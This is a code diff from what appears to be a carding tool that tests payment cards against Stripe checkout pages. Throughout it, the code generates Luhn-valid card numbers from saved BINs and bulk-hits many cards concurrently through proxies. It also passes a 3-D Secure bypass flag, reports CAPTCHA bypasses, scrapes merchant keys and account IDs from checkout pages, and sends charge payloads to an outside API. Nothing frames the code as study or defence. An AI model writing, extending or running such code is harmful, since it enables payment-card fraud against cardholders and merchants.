-                        message_keys = ["message", "error", "msg", "reason", "details", "decline_code"]
-                        for src in message_sources:
-                            for key in message_keys:
-                                val = src.get(key)
-                                if val and isinstance(val, str):
-                                    message = val
-                                    break
-                            if message != "Unknown Response":
+                s = await get_charge_session()
+                async with s.post("https://api.barryxapi.xyz/stripe_invoice", json=payload, headers={"Content-Type": "application/json"}) as res:
+                    data = await res.json()
+                    api_result = data.get("result", {}) if isinstance(data.get("result"), dict) else data
+                    raw_status = api_result.get("status", data.get("status", data.get("response", "DECLINED")))
+                    status = str(raw_status).upper()
+                    
+                    message = "Unknown Response"
+                    message_sources = [api_result, data]
+                    message_keys = ["message", "error", "msg", "reason", "details", "decline_code"]
+                    for src in message_sources:
+                        for key in message_keys:
+                            val = src.get(key)
+                            if val and isinstance(val, str):
+                                message = val
                                 break
-                        elapsed = round(time.perf_counter() - start_time, 2)
-                        return {
-                            "status": status,
-                            "response": message,
-                            "merchant": "Stripe Invoice",
-                            "product": "Invoice Payment",
-                            "amount": api_result.get("amount") or "Unknown",
-                            "time": elapsed
-                        }
+                        if message != "Unknown Response": break
+                    
+                    elapsed = round(time.perf_counter() - start_time, 2)
+                    return {
+                        "status": status,
+                        "response": message,
+                        "merchant": "Stripe Invoice",
+                        "product": "Invoice Payment",
+                        "amount": api_result.get("amount") or "Unknown",
+                        "time": elapsed
+                    }
             except Exception as e:
                 return {
                     "status": "ERROR",
@@ -1676,7 +1642,7 @@ async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None
                 "amount": "0.00",
                 "time": 0
             }
-
+        
         checkout_info = await get_checkout_info(checkout_url, proxy_str)
         if checkout_info.get("error"):
             merchant_name = "ERROR: No checkout URL provided" if not checkout_url else (checkout_info.get("merchant") or "Unknown")
@@ -1688,9 +1654,9 @@ async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None
                 "amount": "0.00",
                 "time": checkout_info.get("time", 0)
             }
-
-        result = await charge_card(card, checkout_info, proxy_str)
-
+        
+        result = await charge_card(card, checkout_info, proxy_str, bypass_3ds=bypass_3ds)
+        
         final_result = {
             "status": result.get("status", "UNKNOWN"),
             "response": result.get("response", "No response from gateway"),
@@ -1706,10 +1672,10 @@ async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None
             "secondary_response": result.get("secondary_response", ""),
             "captcha_bypassed": result.get("captcha_bypassed", False)
         }
-
+        
         print(f"[CO] Final: {final_result['status']} - {final_result['response']} ({final_result['time']}s)")
         return final_result
-
+    
     try:
         result = await asyncio.wait_for(_do_check(), timeout=120.0 if use_browser_fallback else 75.0)
         if not result.get("response"):
@@ -1747,7 +1713,6 @@ async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None
             "time": elapsed
         }
 
-
 async def try_all_approaches(pk: str, cs: str, card: dict, proxy_str: str = None, custom_email: str = None) -> dict:
     checkout_data = {
         "pk": pk,
@@ -1755,11 +1720,13 @@ async def try_all_approaches(pk: str, cs: str, card: dict, proxy_str: str = None
         "url": f"https://checkout.stripe.com/c/pay/{cs}",
         "init_data": None
     }
+    
     checkout_info = await get_checkout_info(checkout_data["url"], proxy_str)
     checkout_data["init_data"] = checkout_info.get("init_data")
     checkout_data["pk"] = checkout_info.get("pk") or pk
     if checkout_info.get("stripe_account"):
         checkout_data["stripe_account"] = checkout_info["stripe_account"]
+    
     if not checkout_data["init_data"]:
         return {
             "status": "ERROR",
@@ -1767,10 +1734,10 @@ async def try_all_approaches(pk: str, cs: str, card: dict, proxy_str: str = None
             "approach": "Direct API",
             "time": checkout_info.get("time", 0)
         }
+    
     result = await charge_card(card, checkout_data, proxy_str, custom_email)
     result["approach"] = "Direct API"
     return result
-
 
 async def fetch_checkout_page_data(url_or_cs: str) -> dict:
     result = {"pk": None, "merchant": None, "price": None, "currency": None, "stripe_account": None}
@@ -1784,19 +1751,25 @@ async def fetch_checkout_page_data(url_or_cs: str) -> dict:
             cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url_or_cs)
             if cs_match:
                 urls_to_try.append(f"https://checkout.stripe.com/c/pay/{cs_match.group(0)}")
+        
         s = await get_session()
         for url in urls_to_try:
             try:
                 async with s.get(url, timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as r:
                     page_html = await r.text()
+                    
                     pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', page_html)
                     if pk_match:
                         result["pk"] = pk_match.group(0)
+                    
+                    # Extract Stripe Connect account ID from page HTML
                     if not result["stripe_account"]:
+                        # Try quoted form first (JSON), then unquoted
                         acct_match = re.search(r'"(acct_[A-Za-z0-9]{6,})"', page_html) or \
                                      re.search(r'(acct_[A-Za-z0-9]{6,})', page_html)
                         if acct_match:
                             result["stripe_account"] = acct_match.group(1)
+                    
                     title_match = re.search(r'<title>([^<]+)</title>', page_html)
                     if title_match:
                         title = title_match.group(1)
@@ -1804,12 +1777,14 @@ async def fetch_checkout_page_data(url_or_cs: str) -> dict:
                             result["merchant"] = title.split(' - ')[0].strip()
                         elif 'Checkout' not in title and 'Stripe' not in title:
                             result["merchant"] = title.strip()
+                    
                     if not result["merchant"]:
                         for pattern in [r'"display_name"\s*:\s*"([^"]+)"', r'"business_name"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                             match = re.search(pattern, page_html)
                             if match and len(match.group(1)) > 2 and match.group(1) not in ['card', 'payment']:
                                 result["merchant"] = match.group(1)
                                 break
+                    
                     price_patterns = [
                         r'"total"\s*:\s*(\d+)', r'"amount"\s*:\s*(\d+)', r'"unit_amount"\s*:\s*(\d+)',
                         r'"amount_total"\s*:\s*(\d+)', r'"amount_subtotal"\s*:\s*(\d+)',
@@ -1821,6 +1796,7 @@ async def fetch_checkout_page_data(url_or_cs: str) -> dict:
                             result["price"] = val / 100 if val > 100 else val
                             if result["price"] > 0:
                                 break
+                    
                     currency_patterns = [
                         r'"currency"\s*:\s*"([a-z]{3})"', r'"presentment_currency"\s*:\s*"([a-z]{3})"',
                     ]
@@ -1829,6 +1805,7 @@ async def fetch_checkout_page_data(url_or_cs: str) -> dict:
                         if currency_match:
                             result["currency"] = currency_match.group(1).upper()
                             break
+                    
                     if result["merchant"] or result["price"]:
                         break
             except:
@@ -1840,7 +1817,6 @@ async def fetch_checkout_page_data(url_or_cs: str) -> dict:
 async def fetch_pk_from_checkout_page(cs: str) -> str:
     data = await fetch_checkout_page_data(cs)
     return data.get("pk")
-
 
 def parse_card(text: str) -> dict:
     text = text.strip()
@@ -1879,13 +1855,16 @@ def format_checkout_info(info: dict) -> str:
     sym = get_currency_symbol(info.get("currency", "USD"))
     price = info.get("price")
     price_str = f"{sym}{price:.2f}" if price else "N/A"
+    
     merchant = html.escape(str(info.get('merchant') or 'Unknown'))
     product = html.escape(str(info.get('product') or 'N/A'))
     country = html.escape(str(info.get('country') or 'N/A'))
     mode = html.escape(str(info.get('mode') or 'PAYMENT'))
     pk = html.escape(str(info.get('pk', 'N/A'))[:30])
     cs = html.escape(str(info.get('cs', 'N/A'))[:25])
+    
     is_trial = info.get("is_trial", False)
+    
     text = f"""🎯 <b>STRIPE CHECKOUT INFO</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -1895,6 +1874,7 @@ def format_checkout_info(info: dict) -> str:
 📦 <b>Product:</b> {product}
 🌍 <b>Country:</b> {country}
 📧 <b>Mode:</b> {mode}"""
+    
     if is_trial:
         text += "\n\n🆓 <b>FREE TRIAL DETECTED</b>"
         trial_days = info.get("trial_period_days")
@@ -1913,6 +1893,7 @@ def format_checkout_info(info: dict) -> str:
             text += f"\n💳 <b>After Trial:</b> {after_price}"
         if info.get("setup_intent"):
             text += "\n🔧 <b>Type:</b> SetupIntent (card saved for later)"
+    
     text += f"""
 
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -1923,8 +1904,10 @@ def format_checkout_info(info: dict) -> str:
 ━━━━━━━━━━━━━━━━━━━━━━
 
 ⏱️ <b>Time:</b> {info.get('time', 0)}s"""
+    
     if info.get('error'):
         text += f"\n⚠️ <b>Note:</b> {html.escape(str(info['error']))}"
+    
     return text
 
 def mask_card(card: dict) -> str:
@@ -1943,6 +1926,7 @@ def format_card_result(result: dict, card: dict, info: dict = None) -> str:
     code = result.get("code", "unknown")
     decline_code = result.get("decline_code", "N/A")
     response = result.get("response", "N/A")
+    
     if status == "CHARGED":
         status_text = "Charged ✅"
     elif status == "3DS_REQUIRED":
@@ -1953,6 +1937,7 @@ def format_card_result(result: dict, card: dict, info: dict = None) -> str:
         status_text = "CAPTCHA ⚠️"
     else:
         status_text = f"{status} ⚠️"
+    
     text = f"""🚀 Card ➜ {full_card(card)}
 ⌚ Status ➜ {status_text}
 ⚡ Code ➜ {code}
@@ -1976,6 +1961,7 @@ def format_charge_result(result: dict, info: dict, card: dict = None) -> str:
     code = html.escape(str(result.get("code", "N/A")))
     decline_code = html.escape(str(result.get("decline_code", "N/A")))
     response_text = html.escape(str(result.get('response', 'N/A')))
+    
     if status == "CHARGED":
         status_text = "✅ Charged"
     elif status == "3DS_REQUIRED":
@@ -1986,8 +1972,10 @@ def format_charge_result(result: dict, info: dict, card: dict = None) -> str:
         status_text = "⚠️ CAPTCHA"
     else:
         status_text = f"⚠️ {html.escape(str(status))}"
+    
     card_str = f"<code>{full_card(card)}</code>" if card else "N/A"
     merchant = html.escape(str(info.get('merchant') or 'Unknown'))
+    
     text = f"""🚀 Card ➜ {card_str}
 ⌚️ Status ➜ {status_text}
 ⚡️ Code ➜ {code}
@@ -1997,10 +1985,13 @@ def format_charge_result(result: dict, info: dict, card: dict = None) -> str:
 🏢 Merchant: {merchant}
 💰 Amount: {price_str} {currency}
 ⏱️ Time: {result.get('time', 0)}s"""
+    
     return text
 
 
-# ── Saved BINs ────────────────────────────────────────────────────────────────
+# ============================================================================
+# SAVED BINS - JSON file based storage
+# ============================================================================
 
 SAVED_BINS_FILE = "data/saved_bins.json"
 
@@ -2020,6 +2011,7 @@ def _save_bins_file(data: dict):
 
 
 def save_user_bin(user_id: int, name: str, bin_value: str) -> bool:
+    """Save a BIN for a user. Returns True on success."""
     data = _load_saved_bins()
     uid = str(user_id)
     if uid not in data:
@@ -2030,6 +2022,7 @@ def save_user_bin(user_id: int, name: str, bin_value: str) -> bool:
 
 
 def get_user_saved_bins(user_id: int) -> list:
+    """Return list of saved BINs for user: [{'name': ..., 'bin_value': ...}]"""
     data = _load_saved_bins()
     uid = str(user_id)
     bins = data.get(uid, {})
@@ -2037,6 +2030,7 @@ def get_user_saved_bins(user_id: int) -> list:
 
 
 def delete_user_bin(user_id: int, name: str) -> bool:
+    """Delete a saved BIN for a user. Returns True if deleted."""
     data = _load_saved_bins()
     uid = str(user_id)
     if uid in data and name.lower() in data[uid]:
@@ -2046,11 +2040,14 @@ def delete_user_bin(user_id: int, name: str) -> bool:
     return False
 
 
-# ── Card generation (Luhn-valid) ──────────────────────────────────────────────
+# ============================================================================
+# CARD GENERATION (Luhn-valid)
+# ============================================================================
 
 def _luhn_complete(partial: str) -> str:
     """Append the check digit that makes partial a Luhn-valid number."""
     digits = [int(d) for d in partial]
+    # We need to find the check digit
     for d in range(10):
         candidate = digits + [d]
         total = 0
@@ -2138,6 +2135,15 @@ async def bulk_hit_cards(cards: list, checkout_data: dict,
     """
     Concurrently hit all cards against a pre-fetched checkout.
     Yields (card_str, result_dict) tuples as each card finishes.
+
+    Args:
+        cards: list of card strings ("4532xx|mm|yy|cvv")
+        checkout_data: dict returned by get_checkout_info()
+        proxy_str: optional proxy for requests
+        custom_email: optional e-mail override
+
+    Yields:
+        (card_str, result_dict) — result_dict always has a 'status' key
     """
     import asyncio
 
